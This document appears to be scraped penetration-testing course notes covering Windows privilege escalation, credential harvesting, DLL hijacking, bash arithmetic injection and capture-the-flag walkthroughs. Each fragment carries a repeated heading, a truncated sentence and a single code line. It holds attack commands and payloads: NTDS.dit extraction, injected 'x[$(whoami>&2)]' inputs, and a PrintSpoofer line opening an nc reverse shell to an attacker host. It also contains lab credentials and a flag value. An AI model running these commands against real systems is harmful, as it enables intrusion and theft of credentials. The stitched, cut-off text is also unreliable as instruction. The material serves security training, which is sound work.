## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - another-method-is
#cat/UTILS #cpts
Looking at our listener, we have a shell as nt authority\system .

```
nt authority\system
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - choosing-a-target-file
#cat/UTILS #cpts
Next, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share. It is common to encounter file shares with `Public` and `Private` directories with s

```
FullName LastWriteTime Attributes Owner
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - checking-file-ownership
#cat/UTILS #cpts
We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.

```
Volume in drive C has no label.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - taking-ownership-of-the-file
#cat/UTILS #cpts
Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - confirming-ownership-changed
#cat/UTILS #cpts
We can confirm ownership using the same command as before. We now see that our user account is the file owner.

```
Name Directory Owner
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - modifying-the-file-acl
#cat/UTILS #cpts
Let's grant our user full privileges over the target file.

```
processed file: C:\Department Shares\Private\IT\cred.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - reading-the-file
#cat/UTILS #cpts
If all went to plan, we can now read the target file from the command line, open it if we have RDP access, or copy it down to our attack system for additional processing (such as cracking the password for a KeePass datab

```
NIX01 admin
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - files-of-interest
#cat/UTILS #cpts
Some local files of interest may include:

```
c:\inetpub\wwwwroot\web.config
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - verifying-sebackupprivilege-is-enabled
#cat/UTILS #cpts
```
SeBackupPrivilege is disabled
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enabling-sebackupprivilege
#cat/UTILS #cpts
If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.

```
SeBackupPrivilege is enabled
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - copying-a-protected-file
#cat/UTILS #cpts
```
Copied 88 bytes
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attacking-a-domain-controller---copying-ntdsdit
#cat/UTILS #cpts
This group also permits logging in locally to a domain controller. The active directory database `NTDS.dit` is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. How

```
Microsoft DiskShadow version 1.0
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - copying-ntdsdit-locally
#cat/UTILS #cpts
Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

```
Copied 16777216 bytes
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - extracting-credentials-from-ntdsdit
#cat/UTILS #cpts
With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the `administrator`

```
DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - searching-security-logs-using-wevtutil
#cat/UTILS #cpts
```
Process Command Line: net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - searching-security-logs-using-get-winevent
#cat/UTILS #cpts
```
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - loading-dll-as-member-of-dnsadmins
#cat/UTILS #cpts
```
distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - stopping-the-dns-service
#cat/UTILS #cpts
After confirming these permissions, we can issue the following commands to stop and start the service.

```
(STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - starting-the-dns-service
#cat/UTILS #cpts
```
(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-mimilibdll
#cat/UTILS #cpts
As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/t

```
FILE * kdns_logfile
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - target-file
#cat/UTILS #cpts
An example of this is Firefox, which installs the `Mozilla Maintenance Service`. We can update [this exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for

```
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - verify-capcom-driver-is-listed
#cat/UTILS #cpts
Next, verify that the Capcom driver is now listed.

```
Driver Name : Capcom.sys
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - alternate-exploitation---no-gui
#cat/UTILS #cpts
If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary

```
// Launches a command shell process
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - alternate-exploitation---no-gui-2
#cat/UTILS #cpts
The `CommandLine` string in this example would be changed to:

```
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - checking-windows-version
#cat/UTILS #cpts
UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.

```
Major Minor Build Revision
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - reviewing-path-variable
#cat/UTILS #cpts
Let's examine the path variable using the command `cmd /c echo %PATH%`. This reveals the default folders below. The `WindowsApps` folder is within the user's profile and writable by the user.

```
C:\Windows\system32
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - starting-python-http-server-on-attack-host
#cat/UTILS #cpts
Copy the generated DLL to a folder and set up a Python mini webserver to host it.

```
sudo python3 -m http.server 8080
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sharpup
#cat/UTILS #cpts
We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```
=== SharpUp: Running Privilege Escalation Checks ===
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - checking-permissions-with-icacls
#cat/UTILS #cpts
Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged s

```
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - service-binary-path
#cat/UTILS #cpts
```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - check-startup-programs
#cat/UTILS #cpts
We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to an

```
command : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - check-startup-programs-2
#cat/UTILS #cpts
We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to an

```
command : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - after-building-solution
#cat/UTILS #cpts
We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

```
CVE-2020-0668.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - hosting-the-malicious-binary
#cat/UTILS #cpts
We can download it to the target using cURL after starting a Python HTTP server on our attack host like in the `User Account Control` section previously. We can also use wget from the target.

```
$ python3 -m http.server 8080
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - receiving-a-meterpreter-session
#cat/UTILS #cpts
We will get an error trying to start the service but will still receive a callback once the Meterpreter binary executes.

```
meterpreter > getuid
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-process-id
#cat/UTILS #cpts
Next, let's map the process ID (PID) `3324` back to the running process.

```
Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-running-service
#cat/UTILS #cpts
At this point, we have enough information to determine that the Druva inSync application is indeed installed and running, but we can do one last check using the `Get-Service` cmdlet.

```
Status Name DisplayName
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - loadlibrary
#cat/UTILS #cpts
`LoadLibrary` is a widely utilized method for DLL injection, employing the `LoadLibrary` API to load the DLL into the target process's address space. The `LoadLibrary` API is a function provided by the Windows operating

```
int main() {
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dll-hijacking
#cat/UTILS #cpts
`DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify t

```
c++
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dll-hijacking-2
#cat/UTILS #cpts
It loads an `add` function from the `library.dll` and utilises this function to add two numbers. Subsequently, it prints the result of the addition. By examining the program in Process Monitor (procmon), we can observe t

```
16:13:30,0074709 main.exe 47792 Load Image C:\Users\PandaSt0rm\Desktop\Hijack\main.exe SUCCESS Image Base: 0xf60000, Image Size: 0x26000
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - invalid-libraries
#cat/UTILS #cpts
Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in

```
17:55:39,7848570 main.exe 37940 CreateFile C:\Users\PandaSt0rm\Desktop\Hijack\x.dll NAME NOT FOUND Desired Access:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable
#cat/UTILS #cpts
Here is the simple Bash script called `index.cgi`. It is supposed to be used as CGI. It gets parameter called `num` provided by a client and checks whether the `num` equals to 100 or not.

```
echo "OK"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable-2
#cat/UTILS #cpts
Here is the simple Bash script called `index.cgi`. It is supposed to be used as CGI. It gets parameter called `num` provided by a client and checks whether the `num` equals to 100 or not.

```
echo "NG"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable-3
#cat/UTILS #cpts
Think 1 minute... ... Did you get it? The problem is this line.

```
if [[ "$NUM" -eq 100 ]];then
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idbefore-you-readabefore-you-readbefore-you-read
#cat/UTILS #cpts
This article is based on the [report (Japanese)](http://ya.maya.st/d/201909a.html) written by [@yamaya](https://twitter.com/yamaya). All the samples in this article were checked with following versions.

```
$ mksh -c 'echo $KSH_VERSION'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idarithmetic-expression-of-shell-scriptaarithmetic-expression-of-she
#cat/UTILS #cpts
Not only `bash` but also `zsh`, `ksh` and etc ... evaluate integer type variable as same as common programming languages. However, it is not just evaluated as "integer number" but "Arithmetic expression". "Arithmetic exp

```
typeset -i n # declare "n" as integer type ("typeset" is same as "declare")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idarithmetic-expression-of-shell-scriptaarithmetic-expression-of-she-2
#cat/UTILS #cpts
Not only `bash` but also `zsh`, `ksh` and etc ... evaluate integer type variable as same as common programming languages. However, it is not just evaluated as "integer number" but "Arithmetic expression". "Arithmetic exp

```
echo "$a"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idarithmetic-expression-of-shell-scriptaarithmetic-expression-of-she-3
#cat/UTILS #cpts
It just prints the value of `a`. This script is expected to print `5` ANYTIME. Even if any values provided by user, `n` is only affected and `a` is NOT affected. Is it OK so far ? However, unexpected result is shown when

```
$ ./hoge.sh a=10
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idarithmetic-expression-of-shell-scriptaarithmetic-expression-of-she-4
#cat/UTILS #cpts
Why is this happening ? Because the argument was evaluated as "Arithmetic expression". Here is the Bash's manual that explains this behavior. [4.2 Bash Builtin Commands - Bash Reference Manual](https://www.gnu.org/softwa

```
./hoge.ksh a=10
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idarithmetic-expression-of-shell-scriptaarithmetic-expression-of-she-5
#cat/UTILS #cpts
In this case, `n` is assigned `$1` by `=` operator. However, this evaluation is going to be implemented even though the assignment is conducted by `read n` (to use stdin as the value) or `n=$(command)` (to use the result

```
$ (( x[0]=1, x[1]=2 ))
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idarithmetic-expression-of-shell-scriptaarithmetic-expression-of-she-6
#cat/UTILS #cpts
In addition, **command substitution `$(command)` can be stated as the subscript of array like this.**

```
$ (( x[$(echo 0)]=100 ))
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idarithmetic-expression-of-shell-scriptaarithmetic-expression-of-she-7
#cat/UTILS #cpts
**That means, `x[$(command)]` is GRAMMATICALLY CORRECT AS AN ARITHMETIC EXPRESSION.** Wow, that's interesting! Let's modify above example as following.

```
$ ./hoge.sh 'x[$(whoami>&2)]'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idarithmetic-expression-of-shell-scriptaarithmetic-expression-of-she-8
#cat/UTILS #cpts
As you can see, `whoami` command is executed and user name `myuser` is shown. Please note that `whoami` is NOT evaluated on the current shell. It's clear if you run this example with `sudo`.

```
$ sudo ./hoge.sh 'x[$(whoami>&2)]'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idother-affected-expressionsaother-affected-expressionsother-affecte
#cat/UTILS #cpts
```
$ sudo ./script.sh 'x[$(whoami>&2)]'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idother-affected-expressionsaother-affected-expressionsother-affecte-2
#cat/UTILS #cpts
Surprisingly, arithmetic binary operators (like `-eq`, `-le`) used within the `[[ ... ]]` are also same. That means an operand of the operator is evaluated as Arithmetic expression.

```
if [[ $1 -eq 0 ]]; then
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idcsv-injectionacsv-injectioncsv-injection
#cat/UTILS #cpts
The author of the [original report](http://ya.maya.st/d/201909a.html) introduced following script that causes [CSV Injection](http://georgemauer.net/2017/10/07/csv-injection.html). This script just loads the CSV file and

```
echo "$item,$((price*num))"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idcsv-injectionacsv-injectioncsv-injection-2
#cat/UTILS #cpts
But if the CSV file includes malicious input like this, an arbitrary command is executed.

```
hoge,100,x[$(whoami>&2)]
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-idcheck-input-as-stringacheck-input-as-stringcheck-input-as-string
#cat/UTILS #cpts
`=~` operator that compares the string value does not evaluates the value as arithmetic expression. If the value supposed to be digit numbers, check with regular expression in advance.

```
typeset -i n
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-iduse-external-command-as-much-as-possibleause-external-command-as-m
#cat/UTILS #cpts
Originally, shell is the "glue" language to combine multiple commands. Why don't you utilize external commands? For example, `[ ... ]` expression is not affected from this problem. Because it does not interpret builtin a

```
$ which [
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-iduse-external-command-as-much-as-possibleause-external-command-as-m-2
#cat/UTILS #cpts
Therefore, this script is NOT vulnerable.

```
if [ "$1" -eq 0 ]; then
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-iduse-external-command-as-much-as-possibleause-external-command-as-m-3
#cat/UTILS #cpts
```
./script.sh 'x[$(whoami>&2)]'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-iduse-external-command-as-much-as-possibleause-external-command-as-m-4
#cat/UTILS #cpts
```
./script.sh: line 2: [: x[$(whoami>&2)]: integer expression expected
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-iduse-external-command-as-much-as-possibleause-external-command-as-m-5
#cat/UTILS #cpts
Let me introduce one more example. [bashcms](https://github.com/ryuichiueda/bashcms2) is the Content management system (CMS) written in Bash created by [@ryuichiueda](https://twitter.com/uedarobotics). He has published h

```
dir="$(tr -dc 'a-zA-Z0-9_=' <<< ${QUERY_STRING} | sed 's;=;s/;')"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - chrome-dictionary-files
#cat/UTILS #cpts
Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The us

```
Password1234!
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - looking-for-stickynotes-db-files
#cat/UTILS #cpts
```
Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieving-saved-credentials-from-chrome
#cat/UTILS #cpts
Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Goog

```
(_ | _ _. ._ ._ / | _ ._ _ ._ _ _
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-lazagne-help-menu
#cat/UTILS #cpts
We can view the help menu with the `-h` flag.

```
git Run git module
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-all-lazagne-modules
#cat/UTILS #cpts
As we can see, there are many modules available to us. Running the tool with `all` will search for supported applications and return any discovered cleartext credentials. As we can see from the example below, many applic

```
For more information launch it again with the -v option
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - windows-autologon
#cat/UTILS #cpts
Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatica

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - putty
#cat/UTILS #cpts
For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

```
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - citrix-breakout
#cat/UTILS #cpts
* * * Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. Howev

```
CitrixCredentials:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - accessing-smb-share-from-restricted-environment
#cat/UTILS #cpts
Having restrictions set, File Explorer does not allow direct access to SMB shares on the attacker machine, or the Ubuntu server hosting the Citrix environment. However, by utilizing the UNC path within the Windows dialog

```
:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - accessing-smb-share-from-restricted-environment-2
#cat/UTILS #cpts
Having restrictions set, File Explorer does not allow direct access to SMB shares on the attacker machine, or the Ubuntu server hosting the Citrix environment. However, by utilizing the UNC path within the Windows dialog

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalating-privileges
#cat/UTILS #cpts
Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.

```
Output Path
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - monitoring-for-process-command-lines
#cat/UTILS #cpts
When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It

```
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - monitoring-for-process-command-lines-2
#cat/UTILS #cpts
When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It

```
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - monitoring-for-process-command-lines-3
#cat/UTILS #cpts
When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It

```
Compare-Object -ReferenceObject $process -DifferenceObject $process2
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - malicious-scf-file
#cat/UTILS #cpts
In this example, let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to

```
[Shell]
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - discover-mremoteng-configuration-files
#cat/UTILS #cpts
```
Directory: C:\Users\julio\AppData\Roaming\mRemoteNG
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mremoteng-configuration-file---confconsxml
#cat/UTILS #cpts
```
..SNIP..
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - for-loop-to-crack-the-master-password-with-mremoteng_decrypt
#cat/UTILS #cpts
```
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo <password>word; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p <password>word 2>/dev/null;done
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - restic---initialize-backup-directory
#cat/UTILS #cpts
```
Directory: E:\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - restic---back-up-a-directory
#cat/UTILS #cpts
```
repository fdb2e6dd opened successfully, password is correct
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - encoding-file-with-certutil
#cat/UTILS #cpts
We can use the `-encode` flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.

```
CertUtil: -encode command completed successfully
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - decoding-file-with-certutil
#cat/UTILS #cpts
Once the new file has been created, we can use the `-decode` flag to decode the file back to its original contents.

```
CertUtil: -decode command completed successfully.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - checking-local-user-description-field
#cat/UTILS #cpts
Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using t

```
Name Enabled Description
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-computer-description-field-with-get-wmiobject-cmdlet
#cat/UTILS #cpts
We can also enumerate the computer description field via PowerShell using the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) cmdlet w

```
Description
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mount-vmdk-on-linux
#cat/UTILS #cpts
```
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mount-vhdvhdx-on-linux
#cat/UTILS #cpts
```
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sherlock
#cat/UTILS #cpts
Let's run Sherlock to gather more information.

```
Execution Policy Change
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - receiving-reverse-shell
#cat/UTILS #cpts
We get a call back quickly.

```
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - receiving-elevated-reverse-shell
#cat/UTILS #cpts
If all goes to plan, once we type `exploit`, we will receive a new Meterpreter shell as the `NT AUTHORITY\SYSTEM` account and can move on to perform any necessary post-exploitation.

```
msf6 exploit(windows/local/ms10_092_schelevator) > exploit
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cors
#cat/UTILS #cpts
```
fetch('https://api.urvenue.me/v1/eco/ecousers/json/?accountid=3500&systemid=35&appaccountid=3500&appuserid=40929842010&apikey=OPYXBNGODOHWGDPC&sourcecode=internal&sourceloc=3500&appprotocol=https>', {
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cors-2
#cat/UTILS #cpts
```
var req = new XMLHttpRequest()
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - xss---ssrf-into-lfi
#cat/UTILS #cpts
```
x=new XMLHttpRequest
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerate-the-status-database-and-retrieve-the-password-for-the-flag-u
#cat/UTILS #cpts
After spawning the target machine, students need to add the entry `STMIP status.inlanefreight.local` into `/etc/hosts`:

```
sudo sh -c 'echo "STMIP status.inlanefreight.local" >> /etc/hosts'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerate-the-status-database-and-retrieve-the-password-for-the-flag-u-2
#cat/UTILS #cpts
```
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 status.inlanefreight.local" >> /etc/hosts'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-in-the-homesrvadm-directory-2
#cat/UTILS #cpts
```
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 monitoring.inlanefreight.local" >> /etc/hosts'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-in-the-homesrvadm-directory-3
#cat/UTILS #cpts
Subsequently, students need to search through the audit logs for credentials using `aureport`, noticing that the credentials "`srvadm:ILFreightnixadm!`" were used:

```
aureport --tty | less
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-in-the-homesrvadm-directory-4
#cat/UTILS #cpts
(To quit `aureport`, students need to provide `q` as input.) Thus, students need to sign in as the user "srvadm" and supply the account's password `ILFreightnixadm!`:

```
su srvadm
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-in-the-homesrvadm-directory-5
#cat/UTILS #cpts
At last, students need to print out the flag file "flag.txt", which can be found under the directory `/home/srvadm`, with its contents being `b447c27a00e3a348881b0030177000cd`:

```
cat /home/srvadm/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-privileges-on-the-target-host-and-submit-the-contents-of-the-
#cat/UTILS #cpts
On Pwnbox/`PMVPN`, students need to save the key to a file and change it's permissions accordingly:

```
chmod 600 id_rsa
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the
#cat/UTILS #cpts
Students then need to click on the "Login" button found at the top right corner and use the credentials `Administrator:D0tn31Nuk3R0ck$$@123`, which were harvested from the previous question: Subsequently, students need t

```
EXEC sp_configure 'show advanced options', '1'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-2
#cat/UTILS #cpts
Then, using the reverse shell attained from the PowerShell reverse shell one-liner, students need to run the following command to execute `PrintSpoofer64` and catch a shell as `NT AUTHORITY\SYSTEM`:

```
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 9999 -e cmd"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-privileges-on-the-ms01-host-and-submit-the-contents-of-the-fl
#cat/UTILS #cpts
Students then need to print out the contents of the XML file `C:\panther\unattend.xml` (students should know about this file either from digging around themselves or from the section's reading) to find the credentials `i

```
type C:\panther\unattend.xml
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the
#cat/UTILS #cpts
Once successfully connected to the Windows target (`xfreerdp` might seem to hang, however, it is not but takes some time), students need to change directories to `C:\Share`, and use the `net use` command to see the path

```
cd C:\Share
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt-
#cat/UTILS #cpts
Students can now enumerate the domain controller to discover yet another subnet, `172.16.9.0/23`:

```
ipconfig /all
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--2
#cat/UTILS #cpts
Then, students need to perform a ping sweep against the `172.16.9.0/23` subnet, finding `172.16.9.25` to respond:

```
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--3
#cat/UTILS #cpts
